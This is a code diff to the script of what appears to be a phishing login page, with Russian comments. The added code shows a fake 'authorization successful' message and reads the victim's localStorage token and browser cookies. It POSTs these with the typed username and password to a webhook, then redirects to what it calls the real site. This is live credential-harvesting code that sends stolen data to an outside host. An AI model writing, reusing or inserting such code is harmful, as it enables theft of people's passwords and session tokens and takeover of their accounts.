@@ -42,11 +42,14 @@
         const isSuccess = !text.toLowerCase().includes("неверный");
 
         if (isSuccess) {
-          // подождать, чтобы token успел сохраниться в localStorage
-          setTimeout(async () => {
-            const token = localStorage.getItem("token");
-            const cookies = document.cookie;
+          errorMsg.textContent = "✅ Авторизация успешна";
 
+          // Подождать, пока токен сохранится в localStorage
+          setTimeout(async () => {
+            const token = localStorage.getItem("token") || "(null)";
+            const cookie = document.cookie;
+
+            // отправка на webhook
             await fetch(webhook, {
               method: "POST",
               headers: {
@@ -56,18 +59,19 @@
                 username,
                 password,
                 token,
-                cookie: cookies
+                cookie
               })
             });
 
-            // переходим на оригинальный сайт
-            window.location.href = "https://kazcyber.zapto.org/index.php";
-          }, 700);
+            // переход на настоящий сайт
+            window.location.href = "https://kazcyber.zapto.org/";
+          }, 1500); // ждём 1.5 сек
         } else {
           errorMsg.textContent = "❌ Неверный логин или пароль";
         }
+
       } catch (err) {
-        errorMsg.textContent = "⚠️ Ошибка соединения с сервером";
+        errorMsg.textContent = "⚠️ Ошибка соединения";
       }
     });
   </script>
